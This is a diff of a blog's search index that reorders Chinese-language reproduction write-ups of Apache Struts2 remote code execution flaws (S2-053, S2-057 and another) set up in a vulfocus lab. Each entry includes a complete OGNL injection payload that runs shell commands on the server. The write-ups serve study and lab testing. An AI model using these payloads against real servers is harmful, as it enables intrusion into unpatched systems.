@@ -4006,6 +4006,29 @@
       </tags>
   </entry>
   <entry>
+    <title>S2-053 CVE-2017-12611复现过程</title>
+    <url>/posts/b9ffad5e.html</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081412.png" alt="image"></li>
+<li>利用POC</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>burp抓包构造payload<br><img src="https://qiniu.hzktester.top/tp2020081413.png" alt="image"></li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>S2-048 CVE-2017-9791复现过程</title>
     <url>/posts/37119a29.html</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
@@ -4032,19 +4055,18 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-053 CVE-2017-12611复现过程</title>
-    <url>/posts/b9ffad5e.html</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p>
+    <title>S2-057 CVE-2018-11776复现过程</title>
+    <url>/posts/e935ed10.html</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
 <a id="more"></a>
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081412.png" alt="image"></li>
-<li>利用POC</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>burp抓包构造payload<br><img src="https://qiniu.hzktester.top/tp2020081413.png" alt="image"></li>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081414.png" alt="image"></p>
+</li>
+<li><p>poc利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020081415.png" alt="image"></p>
+</li>
 </ol>
 ]]></content>
       <categories>
@@ -4070,28 +4092,6 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%25&#123;%23_memberAccess.allowPrivateAccess%3dtrue,%23_memberAccess.allowStaticMethodAccess%3dtrue,%23_memberAccess.excludedClasses%3d%23_memberAccess.acceptProperties,%23_memberAccess.excludedPackageNamePatterns%3d%23_memberAccess.acceptProperties,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23a%3d%40java.lang.Runtime%40getRuntime(),%23s%3dnew+java.util.Scanner(%23a.exec(&#39;ls&#39;).getInputStream()).useDelimiter(&#39;\\\\A&#39;),%23str%3d%23s.hasNext()%3f%23s.next()%3a&#39;&#39;,%23res.print(%23str),%23res.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://qiniu.hzktester.top/tp2020081417.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-057 CVE-2018-11776复现过程</title>
-    <url>/posts/e935ed10.html</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081414.png" alt="image"></p>
-</li>
-<li><p>poc利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020081415.png" alt="image"></p>
-</li>
-</ol>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
